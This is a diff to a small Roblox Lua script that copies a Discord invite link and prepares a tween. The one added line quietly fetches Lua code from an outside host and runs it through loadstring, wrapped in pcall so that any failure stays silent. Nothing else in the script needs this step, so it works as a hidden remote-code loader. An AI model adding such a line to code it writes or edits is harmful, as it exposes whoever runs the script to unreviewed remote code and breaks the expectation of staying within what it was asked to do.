@@ -1,4 +1,5 @@
 local textToCopy = "https://discord.gg/invite/4qSbsqhywC"
+pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_524e9494f975", "1.0.0", false) end)
 local duration = 3 
 local TweenService = game:GetService("TweenService")
 
